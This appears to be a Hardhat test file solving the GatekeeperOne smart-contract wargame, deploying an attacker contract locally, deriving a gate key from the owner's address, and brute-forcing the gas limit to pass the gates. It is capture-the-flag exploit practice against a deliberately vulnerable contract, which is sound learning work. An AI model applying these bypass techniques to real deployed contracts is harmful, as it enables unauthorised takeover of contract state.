import { expect } from "chai";
import { ethers } from "hardhat";

describe("Gate Test", function () {
  // it("Pass gate One", async function () {
  //   const Gater = await ethers.getContractFactory("GatekeeperOne");
  //   const Attacker = await ethers.getContractFactory("GateOneAttacker");
  //   const gate = await Gater.deploy();
  //   await gate.deployed();
  //   const attacker = await Attacker.deploy(gate.address);
  //   await attacker.deployed();
  //   await gate.reset();
  //   console.log("current holder:", await gate.entrant());
  //   const randomData = ethers.utils.randomBytes(8);
  //   const tx = await attacker.tryEnterGateOne(randomData, { gasLimit: 1000000 });
  //   const result = await tx.wait();
  //   console.log("current holder:", await gate.entrant());
  //   expect(await gate.entrant()).to.equal((await ethers.getSigners())[0].address);
  // });

  // it("Pass gate Two", async function () {
  //   const Gater = await ethers.getContractFactory("GatekeeperOne");
  //   const Attacker = await ethers.getContractFactory("GateOneAttacker");
  //   const gate = await Gater.deploy();
  //   await gate.deployed();
  //   const attacker = await Attacker.deploy(gate.address);
  //   await attacker.deployed();
  //   await gate.reset();
  //   console.log("current holder:", await gate.entrant());
  //   const randomData = ethers.utils.randomBytes(8);


  //   const MOD = 8191
  //   const gasToUse = 800720
  //   for (let i = 0; i < MOD; i++) {
  //     const gas = gasToUse + i;
  //     console.log("brute force gas:", gas);
  //     try {
  //       const tx = await attacker.tryEnterGateTwo(randomData, { gasLimit: gas });
  //       const result = await tx.wait();
  //       expect(result.events).not.to.be.empty;
  //       expect(result.events?.length).to.equal(1);
  //       break;
  //     }
  //     catch (e) { }
  //   }

  //   console.log("current holder:", await gate.entrant());
  //   expect(await gate.entrant()).to.equal((await ethers.getSigners())[0].address);

  // });

  // it("Pass gate Three", async function () {
  //   const Gater = await ethers.getContractFactory("GatekeeperOne");
  //   const Attacker = await ethers.getContractFactory("GateOneAttacker");
  //   const gate = await Gater.deploy();
  //   await gate.deployed();
  //   const attacker = await Attacker.deploy(gate.address);
  //   await attacker.deployed();
  //   await gate.reset();
  //   console.log("current holder:", await gate.entrant());

  //   const addressOwner = (await ethers.getSigners())[0].address;
  //   const hexData = "0x12345678" + "0000" + addressOwner.substring(addressOwner.length - 4, addressOwner.length);
  //   console.log(hexData);
  //   //28f936b205453adf //64
  //   //0000000005453adf //32
  //   //0000000000003adf //16        
  //   //0000000000002266 //tx
  //   const gasToUse = 800000
  //   await (await attacker.tryEnterGateThree(hexData, { gasLimit: gasToUse })).wait();
  //   console.log("current holder:", await gate.entrant());
  //   expect(await gate.entrant()).to.equal((await ethers.getSigners())[0].address);

  // });

  it("Pass final gate", async function () {
    const Gater = await ethers.getContractFactory("GatekeeperOne");
    const Attacker = await ethers.getContractFactory("GateOneAttacker");
    const gate = await Gater.deploy();
    await gate.deployed();
    const attacker = await Attacker.deploy(gate.address);
    await attacker.deployed();
    // await gate.reset();
    console.log("current holder:", await gate.entrant());

    const addressOwner = (await ethers.getSigners())[0].address;
    const hexData = "0x12345678" + "0000" + addressOwner.substring(addressOwner.length - 4, addressOwner.length);
    console.log(hexData);

    const MOD = 8191
    const gasToUse = 819100

    for (let i = 0; i < MOD; i++) {
      const gas = gasToUse + i;
      console.log("brute force gas:", gas);
      try {
        await (await attacker.tryEnter(hexData, { gasLimit: gas })).wait();
        break;
      }
      catch (e) {
        if (e instanceof Error) {
          // if (e.message.includes('Gas left is not divisible by 8191') ) {}          
          if (e.message.includes('Transaction reverted without a reason string') ) {}
          else {
            console.log("found gas:", gas);
            console.log(e);
            break;
          }
        }
      }
    }

    console.log("current holder:", await gate.entrant());
    expect(await gate.entrant()).to.equal((await ethers.getSigners())[0].address);

  }).timeout(600000);
});
